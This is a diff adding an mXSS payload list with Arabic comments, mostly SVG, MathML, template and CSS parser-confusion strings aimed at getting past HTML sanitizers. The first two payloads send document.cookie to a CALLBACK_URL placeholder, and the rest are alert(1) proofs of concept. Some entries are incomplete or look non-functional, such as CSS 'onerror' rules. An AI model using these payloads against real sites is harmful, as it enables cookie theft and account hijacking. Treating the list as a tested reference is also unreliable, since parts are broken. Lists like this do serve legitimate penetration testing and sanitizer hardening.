@@ -1,0 +1,227 @@
+# This list we will using with Mutation XSS (mXSS) type  ( The section follows the xss)
+
+# 1. حمولة الـ (NoScript/Template) - تخدع الفلاتر القديمة
+<noscript><p title="</noscript><img src=x onerror=fetch('CALLBACK_URL?c='+document.cookie)>">
+# 2. حمولة الـ (SVG/ForeignObject) - قمة في الخداع
+<svg><p><style><img src="</style><img src=x onerror=fetch('CALLBACK_URL?c='+document.cookie)>">
+# 3. حمولة الـ (MathLink) - استغلال لمعالجة الـ XML داخل HTML
+<math><mtext><table><mglyph><style>
+<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
+<svg><foreignObject><iframe srcdoc="<img src=x onerror=alert(1)>"></iframe></foreignObject></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><title><img src=x onerror=alert(1)></title></svg>
+<svg><a><animate attributeName=href values=javascript:alert(1) /></a></svg>
+<svg><set attributeName=innerHTML to="<img src=x onerror=alert(1)>"></set></svg>
+<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>
+<math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>
+<details open ontoggle=alert(1)>
+<summary onmouseover=alert(1)>x</summary>
+<form><button formaction=javascript:alert(1)>X</button></form>
+<table><caption><img src=x onerror=alert(1)></caption></table>
+<table><tbody><tr><td><style><img src=x onerror=alert(1)></style></td></tr></tbody></table>
+<select><option><style><img src=x onerror=alert(1)></style></option></select>
+<textarea><svg onload=alert(1)></textarea>
+<noscript><img src=x onerror=alert(1)></noscript>
+<object data="data:text/html,<img src=x onerror=alert(1)>"></object>
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<style>@import 'javascript:alert(1)';</style>
+<div contenteditable><img src=x onerror=alert(1)></div>
+<xmp><img src=x onerror=alert(1)></xmp>
+<svg><style>*{x:expression(alert(1))}</style></svg>
+<svg><animate attributeName=onload values=alert(1) /></svg>
+<svg><foreignObject><div><img src=x onerror=alert(1)></div></foreignObject></svg>
+<svg><style><![CDATA[img{content:url(x);onerror:alert(1)}]]></style></svg>
+<svg><foreignObject><math><mtext><img src=x onerror=alert(1)></mtext></math></foreignObject></svg>
+<math><semantics><annotation-xml><svg onload=alert(1)></svg></annotation-xml></semantics></math>
+<svg><script type="text/template"><img src=x onerror=alert(1)></script></svg>
+<svg><metadata><img src=x onerror=alert(1)></metadata></svg>
+<svg><defs><style><img src=x onerror=alert(1)></style></defs></svg>
+<svg><switch><foreignObject><img src=x onerror=alert(1)></foreignObject></switch></svg>
+<template><svg onload=alert(1)></svg></template>
+<template><img src=x onerror=alert(1)></template>
+<svg><a xlink:href="javascript:alert(1)">x</a></svg>
+<svg><use href="javascript:alert(1)"></use></svg>
+<svg><animateTransform onbegin=alert(1) attributeName=transform></svg>
+<svg><animate attributeName=href values="javascript:alert(1)"></svg>
+<svg><feImage xlink:href="javascript:alert(1)"></feImage></svg>
+<svg><linearGradient><stop onload=alert(1)></stop></linearGradient></svg>
+<svg><filter><feGaussianBlur onload=alert(1) /></filter></svg>
+<svg><image><set attributeName=href to="javascript:alert(1)"/></image></svg>
+<svg><foreignObject><iframe srcdoc="<svg onload=alert(1)>"></iframe></foreignObject></svg>
+<svg><desc>&lt;img src=x onerror=alert(1)&gt;</desc></svg>
+<svg><title>&lt;svg onload=alert(1)&gt;</title></svg>
+<details><summary><svg onload=alert(1)></svg></summary></details>
+<textarea><math><mtext><img src=x onerror=alert(1)></mtext></math></textarea>
+<select><option><svg onload=alert(1)></svg></option></select>
+<noscript><svg onload=alert(1)></svg></noscript>
+<object><param name=movie value="javascript:alert(1)"></object>
+<iframe srcdoc="<math><mtext><img src=x onerror=alert(1)></mtext></math>"></iframe>
+<style>@keyframes x{from{background:url(javascript:alert(1))}}</style>
+<svg><style>@import url("data:text/css,*{background:url(javascript:alert(1))}")</style></svg>
+<div><svg><style><!--</style><img src=x onerror=alert(1)></svg></div>
+<svg><foreignObject><![CDATA[<img src=x onerror=alert(1)>]]></foreignObject></svg>
+<svg><foreignObject><template><img src=x onerror=alert(1)></template></foreignObject></svg>
+<svg><style>@supports(display:block){img{content:url(x);onerror:alert(1)}}</style></svg>
+<math><annotation-xml><![CDATA[<svg onload=alert(1)>]]></annotation-xml></math>
+<svg><script type="text/plain"><img src=x onerror=alert(1)></script></svg>
+<svg><symbol id=x><image onload=alert(1) /></symbol><use href=#x></use></svg>
+<svg><pattern id=p width=1 height=1><image onload=alert(1) /></pattern><rect fill="url(#p)"/></svg>
+<svg><mask id=m><image onload=alert(1) /></mask><rect mask="url(#m)"/></svg>
+<svg><clipPath id=c><image onload=alert(1) /></clipPath><rect clip-path="url(#c)"/></svg>
+<svg><filter id=f><feImage href="javascript:alert(1)"/></filter></svg>
+<svg><animateMotion dur=1s onbegin=alert(1) path="M0 0"/></svg>
+<svg><set attributeName=innerHTML begin=0s to="<img src=x onerror=alert(1)>"/></svg>
+<svg><a><set attributeName=href to="javascript:alert(1)"/></a></svg>
+<svg><foreignObject><details open ontoggle=alert(1)></details></foreignObject></svg>
+<template shadowroot="open"><img src=x onerror=alert(1)></template>
+<template><slot name=x><img src=x onerror=alert(1)></slot></template>
+<xmp><svg onload=alert(1)></xmp>
+<plaintext><img src=x onerror=alert(1)>
+<isindex action=javascript:alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<svg><style><![CDATA[
+@font-face{font-family:x;src:url(javascript:alert(1))}
+]]></style></svg>
+<svg><style>@counter-style x{system:cyclic;symbols:url(javascript:alert(1))}</style></svg>
+<svg><style>:host{background:url(javascript:alert(1))}</style></svg>
+<svg><foreignObject><iframe srcdoc="<template><img src=x onerror=alert(1)></template>"></iframe></foreignObject></svg>
+<svg><desc><![CDATA[</desc><foreignObject><img src=x onerror=alert(1)></foreignObject>]]></svg>
+<math><mtext><svg><style><img src=x onerror=alert(1)></style></svg></mtext></math>
+<svg><title><style><img src=x onerror=alert(1)></style></title></svg>
+<svg><metadata><![CDATA[<img src=x onerror=alert(1)>]]></metadata></svg>
+<svg><foreignObject><style>:root{background:url(javascript:alert(1))}</style></foreignObject></svg>
+<svg><style>@layer x{img{content:url(x);onerror:alert(1)}}</style></svg>
+<svg><style>@property --x{syntax:"*";inherits:true;initial-value:url(javascript:alert(1))}</style></svg>
+<svg><style>body{background:var(--x)}</style></svg>
+<svg><filter id=f><feComponentTransfer onload=alert(1) /></filter>
+<svg><feTurbulence onload=alert(1) /></svg>
+<svg><animate begin=0s onbegin=alert(1) attributeName=x /></svg>
+<svg><set begin=0s onbegin=alert(1) attributeName=x to=1 /></svg>
+<svg><foreignObject><input autofocus onfocus=alert(1)></foreignObject></svg>
+<svg><foreignObject><textarea autofocus onfocus=alert(1)></textarea></foreignObject></svg>
+<svg><foreignObject><select autofocus onfocus=alert(1)></select></foreignObject></svg>
+<svg><foreignObject><marquee onstart=alert(1)>x</marquee></foreignObject></svg>
+<math><annotation-xml encoding="text/html"><template><img src=x onerror=alert(1)></template></annotation-xml></math>
+<math><annotation-xml encoding="application/xhtml+xml"><svg onload=alert(1)></svg></annotation-xml></math>
+<svg><script><![CDATA[</script><img src=x onerror=alert(1)>]]></svg>
+<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></svg>
+<svg><desc><![CDATA[<svg onload=alert(1)>]]></desc></svg>
+<svg><title><![CDATA[<img src=x onerror=alert(1)>]]></title></svg>
+<svg><foreignObject><![CDATA[
+]]></foreignObject></svg>
+<svg><foreignObject><template><slot><img src=x onerror=alert(1)></slot></template></foreignObject></svg>
+<svg><foreignObject><custom-element><img src=x onerror=alert(1)></custom-element></foreignObject></svg>
+<svg><foreignObject><dialog open onclose=alert(1)></dialog></foreignObject></svg>
+<svg><foreignObject><video autoplay onplay=alert(1)></video></foreignObject></svg>
+<svg><foreignObject><audio autoplay onplay=alert(1)></audio></foreignObject></svg>
+<svg><foreignObject><img srcset="x 1w" onerror=alert(1)></foreignObject></svg>
+<svg><image href="data:image/svg+xml,<svg onload=alert(1)>"></svg>
+<iframe srcdoc="<svg><style><img src=x onerror=alert(1)></style></svg>"></iframe>
+<object data="data:image/svg+xml,<svg onload=alert(1)>"></object>
+<embed src="data:image/svg+xml,<svg onload=alert(1)>">
+<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"></use></svg>
+<svg><foreignObject><svg onload=alert(1)></svg></foreignObject></svg>
+<svg><defs><script><![CDATA[alert(1)]]></script></defs></svg>
+<svg><style>@supports(selector(:has(*))){img{content:url(x)}img:onerror{alert(1)}}</style></svg>
+<svg><foreignObject><base href="javascript:alert(1)//"></foreignObject></svg>
+<svg><a href="#"><set attributeName=href begin=0s to="javascript:alert(1)"/></a></svg>
+<svg><image href="#"><animate attributeName=href values="javascript:alert(1)"/></image></svg>
+<svg><foreignObject><form><input type=image src=x onerror=alert(1)></form></foreignObject></svg>
+<svg><foreignObject><object type="image/svg+xml" data="data:image/svg+xml,<svg onload=alert(1)>"></object></foreignObject></svg>
+<svg><foreignObject><iframe srcdoc="<details open ontoggle=alert(1)>"></iframe></foreignObject></svg>
+<math><mtext><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></mtext></math>
+<math><annotation-xml encoding="text/html"><details open ontoggle=alert(1)></details></annotation-xml></math>
+<svg><metadata><script type="text/ecmascript">alert(1)</script></metadata></svg>
+<svg><title></title><script>alert(1)</script></svg>
+<svg><desc></desc><foreignObject><svg onload=alert(1)></svg></foreignObject></svg>
+<template><template><img src=x onerror=alert(1)></template></template>
+<template shadowroot=open><svg onload=alert(1)></svg></template>
+<svg><foreignObject><label><input autofocus onfocus=alert(1)></label></foreignObject></svg>
+<svg><foreignObject><menu><menuitem onclick=alert(1)></menuitem></menu></foreignObject></svg>
+<svg><foreignObject><progress onload=alert(1)></progress></foreignObject></svg>
+<svg><foreignObject><meter onload=alert(1)></meter></foreignObject></svg>
+<svg><foreignObject><svg><style>@import url(javascript:alert(1))</style></svg></foreignObject></svg>
+<svg><image href="javascript:alert(1)"></image>
+<iframe srcdoc="<math><annotation-xml encoding='text/html'><svg onload=alert(1)></svg></annotation-xml></math>"></iframe>
+<svg><foreignObject><svg><desc onload=alert(1)></desc></svg></foreignObject></svg>
+<svg><style>@media all{img{content:url(x)}}img{onerror:alert(1)}</style></svg>
+<svg><defs><foreignObject><img src=x onerror=alert(1)></foreignObject></defs></svg>
+<svg><symbol><foreignObject><img src=x onerror=alert(1)></foreignObject></symbol><use href="#x"></use></svg>
+<svg><g><foreignObject><img src=x onerror=alert(1)></foreignObject></g></svg>
+<svg><mask><foreignObject><img src=x onerror=alert(1)></foreignObject></mask></svg>
+<svg><clipPath><foreignObject><img src=x onerror=alert(1)></foreignObject></clipPath></svg>
+<svg><pattern><foreignObject><img src=x onerror=alert(1)></foreignObject></pattern></svg>
+<svg><linearGradient><foreignObject><img src=x onerror=alert(1)></foreignObject></linearGradient></svg>
+<svg><radialGradient><foreignObject><img src=x onerror=alert(1)></foreignObject></radialGradient></svg>
+<svg><foreignObject><base target=_top href="javascript:alert(1)//"></foreignObject></svg>
+<svg><foreignObject><form><input type=submit formaction=javascript:alert(1)></form></foreignObject></svg>
+<svg><foreignObject><img src="data:image/svg+xml,<svg onload=alert(1)>"></foreignObject></svg>
+<svg><image href="data:image/svg+xml,<svg><style>@import 'javascript:alert(1)'</style></svg>"></svg>
+<svg><animate attributeName=href begin=0s values="javascript:alert(1)"></svg>
+<svg><set attributeName=onload begin=0s to="alert(1)"></svg>
+<math><mrow><svg onload=alert(1)></svg></mrow></math>
+<math><annotation-xml encoding="application/xml"><svg onload=alert(1)></svg></annotation-xml></math>
+<template><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></template>
+<noscript><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></noscript>
+<svg><foreignObject><svg><metadata onload=alert(1)></metadata></svg></foreignObject></svg>
+<svg><defs><style>@supports(display:grid){img{content:url(x)}}img{onerror:alert(1)}</style></defs></svg>
+<svg><g onload=alert(1)></g>
+<svg><use href="#"><animate attributeName=href begin=0s values="javascript:alert(1)"/></use></svg>
+<svg><image><animate attributeName=xlink:href begin=0s values="javascript:alert(1)"/></image></svg>
+<svg><foreignObject><input type=image src=x onerror=alert(1)></foreignObject></svg>
+<svg><foreignObject><select autofocus><option onfocus=alert(1)>x</option></select></foreignObject></svg>
+<svg><foreignObject><details><summary autofocus onfocus=alert(1)>x</summary></details></foreignObject></svg>
+<svg><foreignObject><dialog open><form method=dialog><button autofocus onfocus=alert(1)>x</button></form></dialog></foreignObject></svg>
+<svg><foreignObject><iframe srcdoc="<base href=javascript:alert(1)//><a href=x>"></iframe></foreignObject></svg>
+<svg><foreignObject><svg><style>@import url(data:text/css,*{background:url(javascript:alert(1))})</style></svg></foreignObject></svg>
+<svg><image href="data:image/svg+xml,<svg><animate onbegin=alert(1) attributeName=x/></svg>"></svg>
+<math><semantics><mrow><svg onload=alert(1)></svg></mrow></semantics></math>
+<math><annotation-xml encoding="text/html"><iframe srcdoc="<svg onload=alert(1)>"></iframe></annotation-xml></math>
+<template><math><mtext><svg onload=alert(1)></svg></mtext></math></template>
+<svg><foreignObject><xmp><img src=x onerror=alert(1)></xmp></foreignObject></svg>
+<svg><foreignObject><plaintext><img src=x onerror=alert(1)></plaintext></foreignObject></svg>
+<svg><foreignObject><object data="javascript:alert(1)"></object></foreignObject></svg>
+<svg><foreignObject><embed src="javascript:alert(1)"></foreignObject></svg>
+<svg><style>@font-face{font-family:x;src:url(data:font/woff;base64,d09GRg==)}</style><text onload=alert(1)>x</text></svg>
+<svg><foreignObject><svg><title onload=alert(1)></title></svg></foreignObject></svg>
+<svg><defs><g onload=alert(1)></g></defs></svg>
+<svg><style>@supports(display:contents){img{content:url(x)}}img{onerror:alert(1)}</style></svg>
+<svg><switch onload=alert(1)></switch></svg>
+<svg><a><animateTransform onbegin=alert(1) attributeName=transform /></a></svg>
+<svg><image><set begin=0s attributeName=href to="javascript:alert(1)"/></image></svg>
+<svg><foreignObject><button autofocus onfocus=alert(1)>x</button></foreignObject></svg>
+<svg><foreignObject><fieldset><legend autofocus onfocus=alert(1)>x</legend></fieldset></foreignObject></svg>
+<svg><foreignObject><textarea><svg onload=alert(1)></svg></textarea></foreignObject></svg>
+<svg><foreignObject><iframe srcdoc="<style>@import 'javascript:alert(1)'</style>"></iframe></foreignObject></svg>
+<svg><foreignObject><img src="data:text/html,<svg onload=alert(1)>"></foreignObject></svg>
+<svg><image href="data:text/html,<svg onload=alert(1)>"></svg>
+<math><mrow><annotation-xml encoding="text/html"><svg onload=alert(1)></svg></annotation-xml></mrow></math>
+<math><mtext><foreignObject><img src=x onerror=alert(1)></foreignObject></mtext></math>
+<template><foreignObject><svg onload=alert(1)></svg></foreignObject></template>
+<noscript><math><mtext><svg onload=alert(1)></svg></mtext></math></noscript>
+<svg><foreignObject><details><summary><svg onload=alert(1)></svg></summary></details></foreignObject></svg>
+<svg><foreignObject><table><caption><svg onload=alert(1)></svg></caption></table></foreignObject></svg>
+<svg><foreignObject><ul><li><svg onload=alert(1)></svg></li></ul></foreignObject></svg>
+<svg><foreignObject><svg><style><![CDATA[@import url(javascript:alert(1))]]></style></svg></foreignObject></svg>
+<svg><foreignObject><svg><desc><img src=x onerror=alert(1)></desc></svg></foreignObject></svg>
+<svg><defs><foreignObject><style><img src=x onerror=alert(1)></style></foreignObject></defs></svg>
+<svg><g><animate onbegin=alert(1) attributeName=opacity /></g></svg>
+<svg><image><animateTransform onbegin=alert(1) attributeName=transform /></image></svg>
+<svg><foreignObject><form><input autofocus onfocus=alert(1)></form></foreignObject></svg>
+<svg><foreignObject><label autofocus onfocus=alert(1)>x</label></foreignObject></svg>
+<svg><foreignObject><option autofocus onfocus=alert(1)>x</option></foreignObject></svg>
+<svg><foreignObject><output onload=alert(1)></output></foreignObject></svg>
+<svg><foreignObject><progress value=1 max=1 onload=alert(1)></progress></foreignObject></svg>
+<svg><foreignObject><meter value=1 min=0 max=1 onload=alert(1)></meter></foreignObject></svg>
+<svg><image href="data:image/svg+xml,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>"></svg>
+<svg><use href="data:image/svg+xml,<svg onload=alert(1)></svg>"></use></svg>
+<math><mrow><mtext><img src=x onerror=alert(1)></mtext></mrow></math>
+<math><annotation-xml encoding="application/xhtml+xml"><img src=x onerror=alert(1)></annotation-xml></math>
+<template><svg><style><img src=x onerror=alert(1)></style></svg></template>
+<noscript><svg><style><img src=x onerror=alert(1)></style></svg></noscript>
+<svg><foreignObject><svg><style>@counter-style x{symbols:url(javascript:alert(1))}</style></svg></foreignObject></svg>
+<svg><foreignObject><svg><style>@page{background:url(javascript:alert(1))}</style></svg></foreignObject></svg>
+<svg><foreignObject><svg><style>:host-context(body){background:url(javascript:alert(1))}</style></svg></foreignObject></svg>
